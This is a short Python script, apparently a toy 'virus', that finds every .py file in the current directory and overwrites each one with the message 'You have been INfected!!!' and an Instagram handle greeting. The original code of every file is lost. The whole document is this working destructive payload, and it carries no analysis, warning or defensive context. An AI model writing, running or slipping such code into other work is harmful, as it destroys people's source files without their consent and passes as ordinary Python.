import sys
import glob

def main():
    pythonfiles=glob.glob('*.py')

    for file in pythonfiles:
        with open(file,'r') as f:
            file_code=f.readlines()
        
        final_code=["You have been INfected!!!\n\t\t greetings - instagram.com/root.exe_"]
        
        with open(file,'w') as f:
            f.writelines(final_code)
main()

